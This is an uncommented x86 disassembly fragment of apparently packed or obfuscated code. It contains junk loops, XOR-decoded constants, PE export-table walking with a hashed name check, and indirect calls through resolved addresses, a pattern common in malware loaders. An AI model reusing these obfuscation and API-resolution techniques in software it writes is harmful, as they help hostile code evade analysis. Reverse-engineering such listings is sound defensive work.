  42398a:	call   DWORD PTR ds:0x42503c
  423990:	cmp    DWORD PTR ds:0x42a3dd,0x7
  423997:	jne    0x4239ab
  42399d:	xor    eax,eax
  42399f:	or     eax,DWORD PTR ds:0x42a3dd
  4239a5:	inc    eax
  4239a6:	mov    ds:0x42a3dd,eax
  4239ab:	jmp    0x423962
  4239b0:	mov    eax,DWORD PTR [ebp-0x10]
  4239b3:	mov    ecx,DWORD PTR [ebp+0x10]
  4239b6:	xor    ecx,esi
  4239b8:	mov    edx,0xffcd8d68
  4239bd:	sub    edx,ecx
  4239bf:	add    DWORD PTR [eax],edx
  4239c1:	mov    eax,ds:0x426b96
  4239c6:	mov    eax,DWORD PTR [eax]
  4239c8:	mov    cx,WORD PTR [ebp-0x4]
  4239cc:	movzx  ecx,cx
  4239cf:	add    ecx,DWORD PTR [eax]
  4239d1:	mov    DWORD PTR [ebp-0x18],ecx
  4239d4:	mov    eax,DWORD PTR [ebp+0xc]
  4239d7:	mov    ecx,DWORD PTR [ebp+0xc]
  4239da:	xor    eax,esi
  4239dc:	lea    eax,[eax+eax*1+0x327298]
  4239e3:	xor    ecx,esi
  4239e5:	sub    ecx,eax
  4239e7:	mov    ax,WORD PTR [ebp-0x4]
  4239eb:	movzx  eax,ax
  4239ee:	cmp    eax,ecx
  4239f0:	mov    eax,DWORD PTR [ebp+0x10]
  4239f3:	movzx  ecx,WORD PTR [ebp-0x4]
  4239f7:	jg     0x423a0c
  4239fd:	xor    eax,esi
  4239ff:	sub    ecx,eax
  423a01:	sub    ecx,edi
  423a03:	mov    WORD PTR [ebp-0x4],cx
  423a07:	jmp    0x423a19
  423a0c:	xor    eax,esi
  423a0e:	lea    eax,[eax+ecx*1+0x327298]
  423a15:	mov    WORD PTR [ebp-0x4],ax
  423a19:	mov    eax,DWORD PTR [ebp-0xc]
  423a1c:	cmp    eax,ebx
  423a1e:	je     0x423a32
  423a24:	mov    eax,DWORD PTR [ebp-0x8]
  423a27:	mov    DWORD PTR [eax],0x60341eb0
  423a2d:	jmp    0x423ad9
  423a32:	mov    eax,DWORD PTR [ebp+0x8]
  423a35:	mov    ecx,DWORD PTR [ebp-0x8]
  423a38:	xor    eax,esi
  423a3a:	add    eax,edi
  423a3c:	cmp    DWORD PTR [ecx],eax
  423a3e:	je     0x423ac1
  423a44:	mov    ecx,DWORD PTR [ebp-0x14]
  423a47:	mov    eax,DWORD PTR [ebp-0x8]
  423a4a:	mov    eax,DWORD PTR [eax]
  423a4c:	mov    eax,DWORD PTR [eax+0x3c]
  423a4f:	lea    ecx,[ecx*8+0x78]
  423a56:	add    eax,ecx
  423a58:	mov    ecx,DWORD PTR [ebp-0x8]
  423a5b:	mov    ecx,DWORD PTR [ecx]
  423a5d:	mov    eax,DWORD PTR [eax+ecx*1]
  423a60:	mov    DWORD PTR [ebp-0x1c],eax
  423a63:	mov    eax,DWORD PTR [ebp+0x8]
  423a66:	xor    eax,esi
  423a68:	add    eax,edi
  423a6a:	mov    DWORD PTR [ebp-0x20],eax
  423a6d:	mov    eax,DWORD PTR [ebp+0x8]
  423a70:	mov    ecx,DWORD PTR [ebp-0x1c]
  423a73:	xor    eax,esi
  423a75:	add    eax,edi
  423a77:	cmp    ecx,eax
  423a79:	je     0x423ad9
  423a7f:	mov    eax,DWORD PTR [ebp-0x8]
  423a82:	mov    ecx,DWORD PTR [ebp-0x1c]
  423a85:	add    ecx,DWORD PTR [eax]
  423a87:	mov    DWORD PTR [ebp-0x20],ecx
  423a8a:	mov    eax,DWORD PTR [ebp-0x20]
  423a8d:	mov    ecx,DWORD PTR [ebp-0x8]
  423a90:	mov    eax,DWORD PTR [eax+0xc]
  423a93:	mov    ecx,DWORD PTR [ecx]
  423a95:	mov    al,BYTE PTR [eax+ecx*1]
  423a98:	add    al,0x3b
  423a9a:	xor    al,0x43
  423a9c:	cmp    al,0xc5
  423a9e:	je     0x423ab5
  423aa4:	mov    eax,DWORD PTR [ebp+0x8]
  423aa7:	mov    ecx,DWORD PTR [ebp-0x8]
  423aaa:	xor    eax,esi
  423aac:	add    eax,edi
  423aae:	mov    DWORD PTR [ecx],eax
  423ab0:	jmp    0x423ad9
  423ab5:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  423abc:	jmp    0x423ad9
  423ac1:	mov    eax,DWORD PTR [ebp-0x8]
  423ac4:	mov    ecx,DWORD PTR [ebp-0x18]
  423ac7:	mov    ecx,DWORD PTR [ecx]
  423ac9:	mov    DWORD PTR [eax],ecx
  423acb:	mov    eax,DWORD PTR [ebp+0xc]
  423ace:	mov    eax,DWORD PTR [ebp+0x8]
  423ad1:	push   DWORD PTR [ebp-0x8]
  423ad4:	call   0x42322c
  423ad9:	mov    eax,DWORD PTR [ebp-0xc]
  423adc:	cmp    eax,ebx
  423ade:	je     0x423834
  423ae4:	mov    eax,DWORD PTR [ebp-0x8]
  423ae7:	mov    eax,DWORD PTR [eax]
  423ae9:	pop    edi
  423aea:	pop    esi
  423aeb:	pop    ebx
  423aec:	leave  
  423aed:	ret    0xc
  423af0:	push   ebp
  423af1:	mov    ebp,esp
  423af3:	sub    esp,0x30
  423af6:	and    eax,DWORD PTR ds:0x42a315
  423afc:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  423b03:	and    DWORD PTR ds:0x42a369,0x0
  423b0d:	jmp    0x423b1d
  423b12:	mov    eax,ds:0x42a369
  423b17:	inc    eax
  423b18:	mov    ds:0x42a369,eax
  423b1d:	cmp    DWORD PTR ds:0x42a369,0x13
  423b24:	jae    0x423bc7
  423b2a:	cmp    DWORD PTR ds:0x42a369,0x8
  423b31:	jne    0x423b4d
  423b37:	push   0x0
  423b39:	push   0x14f3
  423b3e:	push   DWORD PTR [ebp-0x1c]
  423b41:	push   DWORD PTR [ebp-0x10]
  423b44:	push   DWORD PTR [ebp-0x1c]
  423b47:	call   DWORD PTR ds:0x425200
  423b4d:	cmp    DWORD PTR ds:0x42a369,0x7
  423b54:	jne    0x423b65
  423b5a:	mov    eax,ds:0x42a369
  423b5f:	inc    eax
  423b60:	mov    ds:0x42a369,eax
  423b65:	jmp    0x423b12
  423b6a:	mov    DWORD PTR ds:0x42a361,0x1e
  423b74:	cmp    DWORD PTR ds:0x42a361,0x0
  423b7b:	je     0x423bc7
  423b81:	cmp    DWORD PTR ds:0x42a361,0x8
  423b88:	jne    0x423b9c
  423b8e:	push   DWORD PTR [ebp-0x18]
  423b91:	push   0x0
  423b93:	push   DWORD PTR [ebp-0x10]
  423b96:	call   DWORD PTR ds:0x425374
  423b9c:	cmp    DWORD PTR ds:0x42a361,0x9
  423ba3:	jne    0x423bb4
  423ba9:	mov    eax,ds:0x42a361
  423bae:	dec    eax
  423baf:	mov    ds:0x42a361,eax
  423bb4:	xor    eax,eax
  423bb6:	xor    eax,DWORD PTR ds:0x42a361
  423bbc:	dec    eax
  423bbd:	mov    ds:0x42a361,eax
  423bc2:	jmp    0x423b74
  423bc7:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  423bce:	mov    ecx,DWORD PTR [ebp-0x4]
  423bd1:	sub    eax,0x7c5
  423bd6:	push   ebx
  423bd7:	xor    eax,eax
  423bd9:	or     eax,DWORD PTR ds:0x42a2c5
  423bdf:	adc    DWORD PTR ds:0x42a315,eax
  423be5:	mov    eax,0x7510850
  423bea:	and    DWORD PTR ds:0x42a369,0x0
  423bf4:	jmp    0x423c06
  423bf9:	mov    ebx,DWORD PTR ds:0x42a369
  423bff:	inc    ebx
  423c00:	mov    DWORD PTR ds:0x42a369,ebx
  423c06:	cmp    DWORD PTR ds:0x42a369,0x16
  423c0d:	jae    0x423c8e
  423c13:	cmp    DWORD PTR ds:0x42a369,0xe
  423c1a:	jne    0x423c29
  423c20:	push   DWORD PTR [ebp-0x18]
  423c23:	call   DWORD PTR ds:0x425040
  423c29:	cmp    DWORD PTR ds:0x42a369,0xd
  423c30:	jne    0x423c43
  423c36:	mov    ebx,DWORD PTR ds:0x42a369
  423c3c:	inc    ebx
  423c3d:	mov    DWORD PTR ds:0x42a369,ebx
  423c43:	jmp    0x423bf9
  423c48:	mov    DWORD PTR ds:0x42a3e1,0x1d
  423c52:	cmp    DWORD PTR ds:0x42a3e1,0x0
  423c59:	je     0x423c8e
  423c5f:	cmp    DWORD PTR ds:0x42a3e1,0x2c
  423c66:	jne    0x423c7c
  423c6c:	push   0x1552
  423c71:	push   0x42a4c6
  423c76:	call   DWORD PTR ds:0x425044
  423c7c:	mov    ebx,DWORD PTR ds:0x42a3e1
  423c82:	dec    ebx
  423c83:	mov    DWORD PTR ds:0x42a3e1,ebx
  423c89:	jmp    0x423c52
  423c8e:	xor    ecx,eax
  423c90:	and    DWORD PTR ds:0x42a3d1,0x0
  423c9a:	jmp    0x423cac
  423c9f:	mov    ebx,DWORD PTR ds:0x42a3d1
  423ca5:	inc    ebx
  423ca6:	mov    DWORD PTR ds:0x42a3d1,ebx
  423cac:	cmp    DWORD PTR ds:0x42a3d1,0x17
  423cb3:	jae    0x423cda
  423cb9:	cmp    DWORD PTR ds:0x42a3d1,0x27
  423cc0:	jne    0x423ccf
  423cc6:	push   DWORD PTR [ebp-0xc]
  423cc9:	call   DWORD PTR ds:0x425378
  423ccf:	jmp    0x423c9f
  423cd4:	or     ebx,DWORD PTR ds:0x42a3a1
  423cda:	mov    ebx,0x327298
  423cdf:	adc    DWORD PTR ds:0x42a3ad,0x42a351
  423ce9:	add    ecx,ebx
  423ceb:	mov    DWORD PTR ds:0x42a3e9,0x58ad
  423cf5:	mov    DWORD PTR [ebp-0x1c],ecx
  423cf8:	and    DWORD PTR ds:0x42a2bd,ebx
  423cfe:	mov    ecx,DWORD PTR [ebp+0x14]
  423d01:	push   esi
  423d02:	push   edi
  423d03:	sbb    DWORD PTR ds:0x42a319,0x49a0
  423d0d:	test   ecx,ecx
  423d0f:	je     0x423d29
  423d15:	adc    DWORD PTR ds:0x42a2bd,0x603
  423d1f:	mov    ecx,DWORD PTR [ebp+0x14]
  423d22:	mov    ecx,DWORD PTR [ecx]
  423d24:	sub    edi,esi
  423d26:	mov    DWORD PTR [ebp-0x1c],ecx
  423d29:	and    DWORD PTR ds:0x42a395,0x0
  423d33:	mov    ecx,DWORD PTR ds:0x42a395
  423d39:	inc    ecx
  423d3a:	mov    DWORD PTR ds:0x42a395,ecx
  423d40:	cmp    DWORD PTR ds:0x42a395,0x24
  423d47:	jne    0x423d5d
  423d4d:	push   0x575c
  423d52:	push   0x61f5
  423d57:	call   DWORD PTR ds:0x42537c
  423d5d:	cmp    DWORD PTR ds:0x42a395,0x18
  423d64:	jb     0x423d33
  423d6a:	imul   edx,eax
  423d6d:	mov    ecx,0x4573
  423d72:	sub    DWORD PTR ds:0x42a321,0x7410
  423d7c:	add    edx,ecx
  423d7e:	sub    esi,esi
  423d80:	mov    esi,0x7879
  423d85:	xor    DWORD PTR ds:0x42a2d5,0x42a2d1
  423d8f:	mov    edi,0x1556
  423d94:	xchg   esi,ecx
  423d96:	sub    ecx,DWORD PTR ds:0x42a36d
  423d9c:	sub    edx,edi
  423d9e:	xor    esi,esi
  423da0:	add    ecx,0x38ee
  423da6:	mov    DWORD PTR [ebp-0x28],esi
  423da9:	mov    DWORD PTR [ebp-0x2c],esi
  423dac:	mov    DWORD PTR [ebp-0x14],esi
  423daf:	xor    DWORD PTR ds:0x42a351,0x1187
  423db9:	mov    DWORD PTR [ebp-0x8],esi
  423dbc:	mov    ecx,DWORD PTR [ebp-0x18]
  423dbf:	sub    DWORD PTR ds:0x42a2d9,0x42a3a1
  423dc9:	xor    ecx,eax
  423dcb:	xor    edi,edi
  423dcd:	add    DWORD PTR ds:0x42a2d5,0x42a321
  423dd7:	add    ecx,ebx
  423dd9:	mov    eax,ds:0x42a3e5
  423dde:	mov    DWORD PTR [ebp-0x20],ecx
  423de1:	mov    eax,DWORD PTR [ebp-0x20]
  423de4:	je     0x424033
  423dea:	mov    eax,DWORD PTR [ebp-0x4]
  423ded:	xor    eax,0x7510850
  423df2:	add    eax,ebx
  423df4:	cmp    edi,eax
  423df6:	mov    DWORD PTR ds:0x42a3e1,0x1204
  423e00:	jne    0x423fd6
  423e06:	push   DWORD PTR [ebp+0x8]
  423e09:	call   0x424bdc
  423e0e:	and    DWORD PTR ds:0x42a3dd,0x0
  423e18:	jmp    0x423e2a
  423e1d:	mov    esi,DWORD PTR ds:0x42a3dd
  423e23:	inc    esi
  423e24:	mov    DWORD PTR ds:0x42a3dd,esi
  423e2a:	cmp    DWORD PTR ds:0x42a3dd,0x1c
  423e31:	jae    0x423e6e
  423e37:	cmp    DWORD PTR ds:0x42a3dd,0x7
  423e3e:	jne    0x423e4f
  423e44:	push   0x4aee
  423e49:	call   DWORD PTR ds:0x425048
  423e4f:	cmp    DWORD PTR ds:0x42a3dd,0x6
  423e56:	jne    0x423e69
  423e5c:	mov    esi,DWORD PTR ds:0x42a3dd
  423e62:	inc    esi
  423e63:	mov    DWORD PTR ds:0x42a3dd,esi
  423e69:	jmp    0x423e1d
  423e6e:	mov    DWORD PTR [ebp-0x20],eax
  423e71:	mov    eax,DWORD PTR [ebp-0x4]
  423e74:	xor    DWORD PTR ds:0x42a2c1,0x1ce4
  423e7e:	mov    ecx,DWORD PTR [ebp-0x20]
  423e81:	mov    DWORD PTR ds:0x42a319,0x17
  423e8b:	cmp    DWORD PTR ds:0x42a319,0x0
  423e92:	je     0x423edc
  423e98:	cmp    DWORD PTR ds:0x42a319,0xb
  423e9f:	jne    0x423eb0
  423ea5:	push   0x1
  423ea7:	push   DWORD PTR [ebp-0x1c]
  423eaa:	call   DWORD PTR ds:0x425204
  423eb0:	cmp    DWORD PTR ds:0x42a319,0xc
  423eb7:	jne    0x423eca
  423ebd:	mov    esi,DWORD PTR ds:0x42a319
  423ec3:	dec    esi
  423ec4:	mov    DWORD PTR ds:0x42a319,esi
  423eca:	mov    esi,DWORD PTR ds:0x42a319
  423ed0:	dec    esi
  423ed1:	mov    DWORD PTR ds:0x42a319,esi
  423ed7:	jmp    0x423e8b
  423edc:	mov    esi,0x7510850
  423ee1:	xor    eax,esi
  423ee3:	add    eax,ebx
  423ee5:	cmp    ecx,eax
  423ee7:	je     0x424017
  423eed:	push   DWORD PTR [ebp-0x20]
  423ef0:	push   DWORD PTR [ebp+0x8]
  423ef3:	add    DWORD PTR ds:0x42a31d,0x74d7
  423efd:	call   0x4245cb
  423f02:	movzx  ecx,WORD PTR ds:0x42a3d5
  423f09:	sbb    ecx,DWORD PTR ds:0x42a2c9
  423f0f:	mov    DWORD PTR ds:0x42a3d5,ecx
  423f15:	mov    DWORD PTR [ebp-0x14],eax
  423f18:	mov    eax,DWORD PTR [ebp-0x4]
  423f1b:	and    DWORD PTR ds:0x42a329,0x0
  423f25:	mov    ecx,DWORD PTR ds:0x42a329
  423f2b:	inc    ecx
  423f2c:	mov    DWORD PTR ds:0x42a329,ecx
  423f32:	cmp    DWORD PTR ds:0x42a329,0x16
  423f39:	jne    0x423f4a
  423f3f:	push   0x42a643
  423f44:	call   DWORD PTR ds:0x425208
  423f4a:	cmp    DWORD PTR ds:0x42a329,0x12
  423f51:	jb     0x423f25
  423f57:	mov    DWORD PTR ds:0x42a3a1,0x1f
  423f61:	cmp    DWORD PTR ds:0x42a3a1,0x0
  423f68:	je     0x423f98
  423f6e:	cmp    DWORD PTR ds:0x42a3a1,0x26
  423f75:	jne    0x423f84
  423f7b:	push   DWORD PTR [ebp-0x14]
  423f7e:	call   DWORD PTR ds:0x425380
  423f84:	xor    ecx,ecx
  423f86:	add    ecx,DWORD PTR ds:0x42a3a1
  423f8c:	dec    ecx
  423f8d:	mov    DWORD PTR ds:0x42a3a1,ecx
  423f93:	jmp    0x423f61
  423f98:	mov    ecx,DWORD PTR [ebp-0x14]
  423f9b:	xor    eax,esi
  423f9d:	add    eax,ebx
  423f9f:	cmp    ecx,eax
  423fa1:	je     0x424017
  423fa7:	mov    eax,DWORD PTR [ebp-0x14]
  423faa:	mov    eax,DWORD PTR [eax+0x18]
  423fad:	mov    DWORD PTR [ebp-0x20],eax
  423fb0:	mov    eax,DWORD PTR [ebp-0x14]
  423fb3:	mov    ecx,DWORD PTR [ebp+0x8]
  423fb6:	add    ecx,DWORD PTR [eax+0x20]
  423fb9:	mov    DWORD PTR [ebp-0x28],ecx
  423fbc:	mov    eax,DWORD PTR [ebp-0x14]
  423fbf:	mov    ecx,DWORD PTR [ebp+0x8]
  423fc2:	add    ecx,DWORD PTR [eax+0x24]
  423fc5:	mov    DWORD PTR [ebp-0x2c],ecx
  423fc8:	mov    eax,DWORD PTR [ebp-0x14]
  423fcb:	mov    ecx,DWORD PTR [ebp+0x8]
  423fce:	add    ecx,DWORD PTR [eax+0x1c]
  423fd1:	xor    esi,esi
  423fd3:	mov    DWORD PTR [ebp-0x14],ecx
  423fd6:	mov    eax,DWORD PTR [ebp-0x28]
  423fd9:	mov    ecx,DWORD PTR [ebp+0x8]
  423fdc:	add    ecx,DWORD PTR [eax+edi*4]
  423fdf:	lea    eax,[ebp-0x8]
  423fe2:	mov    DWORD PTR [ebp-0x30],ecx
  423fe5:	push   eax
  423fe6:	push   DWORD PTR [ebp-0x30]
  423fe9:	push   DWORD PTR [ebp+0xc]
  423fec:	call   0x4248d9
  423ff1:	mov    eax,DWORD PTR [ebp-0x4]
  423ff4:	mov    ecx,DWORD PTR [ebp-0x8]
  423ff7:	xor    eax,0x7510850
  423ffc:	add    eax,ebx
  423ffe:	cmp    ecx,eax
  424000:	jne    0x424023
  424006:	mov    eax,DWORD PTR [ebp-0x20]
  424009:	inc    edi
  42400a:	cmp    edi,eax
  42400c:	jb     0x423dea
  424012:	jmp    0x424033
  424017:	mov    eax,DWORD PTR [ebp-0x4]
  42401a:	xor    eax,esi
  42401c:	add    eax,ebx
  42401e:	jmp    0x424181
  424023:	mov    eax,DWORD PTR [ebp-0x2c]
  424026:	movzx  eax,WORD PTR [eax+edi*2]
  42402a:	mov    ecx,DWORD PTR [ebp-0x14]
  42402d:	mov    eax,DWORD PTR [ecx+eax*4]
  424030:	mov    DWORD PTR [ebp+0xc],eax
  424033:	mov    eax,DWORD PTR [ebp-0x4]
  424036:	mov    ecx,DWORD PTR [ebp-0x8]
  424039:	xor    eax,0x7510850
  42403e:	add    eax,ebx
  424040:	cmp    ecx,eax
  424042:	jne    0x424055
  424048:	mov    eax,DWORD PTR [ebp-0x4]
  42404b:	xor    eax,0x7510850
  424050:	jmp    0x42401c
  424055:	mov    eax,DWORD PTR [ebp+0xc]
  424058:	add    eax,DWORD PTR [ebp+0x8]
  42405b:	mov    DWORD PTR [ebp-0x10],eax
  42405e:	mov    eax,DWORD PTR [ebp-0x1c]
  424061:	test   eax,eax
  424063:	je     0x424133
  424069:	mov    DWORD PTR [ebp-0x24],esi
  42406c:	push   0xb
  42406e:	pop    ecx
  42406f:	push   0x5
  424071:	dec    ecx
  424072:	pop    ebx
  424073:	xchg   ebx,ecx
  424075:	sub    ebx,ecx
  424077:	xchg   ebx,ecx
  424079:	dec    ecx
  42407a:	mov    eax,DWORD PTR [ebp-0x1c]
  42407d:	imul   eax,ecx
  424080:	sub    esp,eax
  424082:	mov    DWORD PTR [ebp-0x24],esp
  424085:	mov    eax,DWORD PTR [ebp-0x4]
  424088:	mov    ecx,0x7510850
  42408d:	xor    eax,ecx
  42408f:	mov    edx,0x327298
  424094:	add    eax,edx
  424096:	mov    DWORD PTR [ebp+0x8],eax
  424099:	mov    eax,DWORD PTR [ebp-0x18]
  42409c:	xor    eax,ecx
  42409e:	add    eax,edx
  4240a0:	mov    edx,DWORD PTR [ebp+0x14]
  4240a3:	imul   eax,DWORD PTR [edx]
  4240a6:	mov    edx,DWORD PTR [ebp-0x4]
  4240a9:	xor    edx,ecx
  4240ab:	mov    ecx,DWORD PTR [ebp+0x8]
  4240ae:	lea    ecx,[edx+ecx*1+0x327298]
  4240b5:	cmp    ecx,eax
  4240b7:	je     0x42412e
  4240bd:	mov    edi,DWORD PTR [ebp-0x18]
  4240c0:	mov    eax,DWORD PTR [ebp+0x8]
  4240c3:	mov    edx,DWORD PTR [ebp+0x14]
  4240c6:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4240ca:	mov    ecx,0x7510850
  4240cf:	xor    edx,edx
  4240d1:	xor    edi,ecx
  4240d3:	mov    esi,0x327298
  4240d8:	add    edi,esi
  4240da:	div    edi
  4240dc:	mov    edx,DWORD PTR [ebp-0x4]
  4240df:	xor    edx,ecx
  4240e1:	lea    eax,[edx+eax*1+0x327298]
  4240e8:	mov    edx,DWORD PTR [ebp+0x8]
  4240eb:	mov    edi,DWORD PTR [ebp-0x24]
  4240ee:	mov    DWORD PTR [edi+edx*4],eax
  4240f1:	mov    eax,DWORD PTR [ebp-0x18]
  4240f4:	mov    edx,DWORD PTR [ebp+0x8]
  4240f7:	xor    eax,ecx
  4240f9:	lea    eax,[eax+edx*1+0x327298]
  424100:	mov    DWORD PTR [ebp+0x8],eax
  424103:	mov    eax,DWORD PTR [ebp-0x18]
  424106:	mov    edx,DWORD PTR [ebp+0x14]
  424109:	xor    eax,ecx
  42410b:	add    eax,esi
  42410d:	imul   eax,DWORD PTR [edx]
  424110:	mov    edx,DWORD PTR [ebp-0x4]
  424113:	xor    edx,ecx
  424115:	mov    ecx,DWORD PTR [ebp+0x8]
  424118:	lea    ecx,[edx+ecx*1+0x327298]
  42411f:	cmp    ecx,eax
  424121:	jne    0x4240bd
  424127:	mov    ebx,esi
  424129:	jmp    0x424133
  42412e:	mov    ebx,0x327298
  424133:	mov    eax,DWORD PTR [ebp-0x4]
  424136:	xor    eax,0x7510850
  42413b:	add    eax,ebx
  42413d:	mov    DWORD PTR [ebp-0xc],eax
  424140:	xor    ebx,ebx
  424142:	lea    eax,[ebp-0x10]
  424145:	add    ebx,DWORD PTR [eax]
  424147:	call   ebx
  424149:	xor    ebx,ebx
  42414b:	inc    ebx
  42414c:	cmp    DWORD PTR [ebp+0x10],ebx
  42414f:	je     0x42416d
  424155:	xchg   edx,eax
  424156:	push   0xa
  424158:	pop    ecx
  424159:	push   0x4
  42415b:	pop    ebx
  42415c:	inc    ebx
  42415d:	xchg   ebx,ecx
  42415f:	sub    ebx,ecx
  424161:	xchg   ebx,ecx
  424163:	dec    ecx
  424164:	mov    eax,DWORD PTR [ebp-0x1c]
  424167:	imul   eax,ecx
  42416a:	add    esp,eax
  42416c:	xchg   edx,eax
  42416d:	push   eax
  42416e:	xor    ebx,ebx
  424170:	mov    edx,esp
  424172:	dec    edx
  424173:	inc    ebx
  424174:	add    ebx,DWORD PTR [edx+ebx*1]
  424177:	dec    ebx
  424178:	xor    edx,edx
  42417a:	add    DWORD PTR [ebp-0xc],ebx
  42417d:	pop    ebx
  42417e:	mov    eax,DWORD PTR [ebp-0xc]
  424181:	pop    edi
  424182:	pop    esi
  424183:	pop    ebx
  424184:	leave  
  424185:	ret    0x10
  424188:	push   ebp
  424189:	mov    ebp,esp
  42418b:	push   ecx
  42418c:	mov    DWORD PTR ds:0x42a351,0x1c54
  424196:	push   ecx
  424197:	mov    eax,0xf89c8539
  42419c:	not    DWORD PTR ds:0x42a2e1
  4241a2:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  4241a9:	push   esi
  4241aa:	mov    DWORD PTR ds:0x42a3ad,0x7f3d
  4241b4:	mov    DWORD PTR [ebp-0x8],eax
  4241b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4241ba:	mov    DWORD PTR ds:0x42a369,0x16bb
  4241c4:	push   edi
  4241c5:	mov    edi,0x7510850
  4241ca:	movzx  esi,WORD PTR ds:0x42a35d
  4241d1:	mov    esi,0x327298
  4241d6:	cmp    ecx,eax
  4241d8:	je     0x4242c3
  4241de:	mov    eax,ds:0x42a355
  4241e3:	or     eax,DWORD PTR ds:0x42a2b9
  4241e9:	mov    ds:0x42a355,eax
  4241ee:	mov    eax,DWORD PTR [ebp-0x4]
  4241f1:	add    ecx,DWORD PTR ds:0x42a355
  4241f7:	mov    ecx,DWORD PTR [ebp+0xc]
  4241fa:	and    DWORD PTR ds:0x42a3e5,0x42a2e1
  424204:	xor    eax,edi
  424206:	adc    DWORD PTR ds:0x42a3dd,0x42a3e1
  424210:	add    eax,esi
  424212:	cmp    eax,ecx
  424214:	mov    DWORD PTR ds:0x42a315,0x34ec
  42421e:	je     0x4242c3
  424224:	neg    edx
  424226:	mov    eax,DWORD PTR [ebp-0x4]
  424229:	xor    edx,0x6a0b
  42422f:	xor    eax,edi
  424231:	or     DWORD PTR ds:0x42a36d,ebx
  424237:	add    eax,esi
  424239:	mov    DWORD PTR ds:0x42a391,0x1e
  424243:	cmp    DWORD PTR ds:0x42a391,0x0
  42424a:	je     0x424299
  424250:	cmp    DWORD PTR ds:0x42a391,0x4
  424257:	jne    0x42426d
  42425d:	push   0x7980
  424262:	push   0x42a44e
  424267:	call   DWORD PTR ds:0x42520c
  42426d:	cmp    DWORD PTR ds:0x42a391,0x5
  424274:	jne    0x424287
  42427a:	mov    edx,DWORD PTR ds:0x42a391
  424280:	dec    edx
  424281:	mov    DWORD PTR ds:0x42a391,edx
  424287:	mov    edx,DWORD PTR ds:0x42a391
  42428d:	dec    edx
  42428e:	mov    DWORD PTR ds:0x42a391,edx
  424294:	jmp    0x424243
  424299:	push   eax
  42429a:	neg    edx
  42429c:	push   DWORD PTR [ebp-0x8]
  42429f:	push   DWORD PTR [ebp-0x4]
  4242a2:	mov    edx,DWORD PTR ds:0x426ac2
  4242a8:	call   0x4229f3
  4242ad:	mov    ecx,DWORD PTR ds:0x426ac2
  4242b3:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4242b9:	mov    DWORD PTR [ecx],eax
  4242bb:	mov    eax,DWORD PTR [ebp-0x8]
  4242be:	jmp    0x4242fb
  4242c3:	mov    eax,DWORD PTR [ebp-0x4]
  4242c6:	mov    ecx,DWORD PTR [ebp+0x10]
  4242c9:	xor    eax,edi
  4242cb:	add    eax,esi
  4242cd:	cmp    eax,ecx
  4242cf:	jne    0x4242f8
  4242d5:	mov    eax,DWORD PTR [ebp-0x4]
  4242d8:	xor    eax,edi
  4242da:	add    eax,esi
  4242dc:	mov    ds:0x426b46,eax
  4242e1:	mov    eax,DWORD PTR [ebp-0x4]
  4242e4:	xor    eax,edi
  4242e6:	add    eax,esi
  4242e8:	mov    ds:0x426b3e,eax
  4242ed:	push   DWORD PTR [ebp-0x8]
  4242f0:	push   DWORD PTR [ebp-0x4]
  4242f3:	call   0x424305
  4242f8:	mov    eax,DWORD PTR [ebp-0x4]
  4242fb:	xor    eax,edi
  4242fd:	pop    edi
  4242fe:	add    eax,esi
  424300:	pop    esi
  424301:	leave  
  424302:	ret    0xc
  424305:	push   ebp
  424306:	mov    ebp,esp
  424308:	sub    esp,0x60
  42430b:	mov    eax,DWORD PTR [ebp+0x8]
  42430e:	push   ebx
  42430f:	push   esi
  424310:	sbb    DWORD PTR ds:0x42a2e1,0x43e9
  42431a:	mov    esi,0x7510850
  42431f:	xor    eax,esi
  424321:	mov    DWORD PTR ds:0x42a2b9,0x11
  42432b:	cmp    DWORD PTR ds:0x42a2b9,0x0
  424332:	je     0x42438a
  424338:	cmp    DWORD PTR ds:0x42a2b9,0x3
  42433f:	jne    0x424356
  424345:	push   DWORD PTR [ebp-0x18]
  424348:	push   DWORD PTR [ebp-0x14]
  42434b:	push   0x6c3c
  424350:	call   DWORD PTR ds:0x425384
  424356:	cmp    DWORD PTR ds:0x42a2b9,0x4
  42435d:	jne    0x424372
  424363:	xor    ebx,ebx
  424365:	add    ebx,DWORD PTR ds:0x42a2b9
  42436b:	dec    ebx
  42436c:	mov    DWORD PTR ds:0x42a2b9,ebx
  424372:	mov    ebx,DWORD PTR ds:0x42a2b9
  424378:	dec    ebx
  424379:	mov    DWORD PTR ds:0x42a2b9,ebx
  42437f:	jmp    0x42432b
  424384:	and    DWORD PTR ds:0x42a39d,edi
  42438a:	mov    ebx,0x327298
  42438f:	add    eax,ebx
  424391:	push   edi
  424392:	and    DWORD PTR ds:0x42a3d5,0x5463
  42439c:	mov    DWORD PTR [ebp-0x18],eax
  42439f:	mov    edi,DWORD PTR [ebp+0x8]
  4243a2:	or     DWORD PTR ds:0x42a2c5,0xd50
  4243ac:	xor    edi,esi
  4243ae:	and    DWORD PTR ds:0x42a369,0x7565
  4243b8:	mov    DWORD PTR [ebp-0xc],0xf89c85f8
  4243bf:	mov    DWORD PTR [ebp-0x10],0xf89c8738
  4243c6:	xor    DWORD PTR ds:0x42a3d9,0x160d
  4243d0:	add    edi,ebx
  4243d2:	mov    DWORD PTR ds:0x42a35d,0x567e
  4243dc:	jmp    0x4245b1
  4243e1:	cmp    edi,0x3f
  4243e4:	jne    0x424437
  4243ea:	mov    DWORD PTR ds:0x42a3ed,edi
  4243f0:	mov    eax,ds:0x426942
  4243f5:	mov    DWORD PTR ds:0x42a315,0x447
  4243ff:	mov    eax,DWORD PTR [eax]
  424401:	mov    DWORD PTR ds:0x42a351,0x1615
  42440b:	mov    DWORD PTR [ebp-0x14],eax
  42440e:	not    DWORD PTR ds:0x42a2c5
  424414:	mov    eax,ds:0x426b4a
  424419:	mov    eax,DWORD PTR [eax]
  42441b:	mov    DWORD PTR ds:0x42a3e1,0xe61
  424425:	mov    DWORD PTR [ebp-0x18],eax
  424428:	mov    DWORD PTR ds:0x42a39d,0x6bdb
  424432:	jmp    0x4245a5
  424437:	mov    DWORD PTR ds:0x42a3a9,0x2c50
  424441:	cmp    edi,0x33c
  424447:	jne    0x424518
  42444d:	mov    DWORD PTR ds:0x42a329,0x14
  424457:	cmp    DWORD PTR ds:0x42a329,0x0
  42445e:	je     0x4244aa
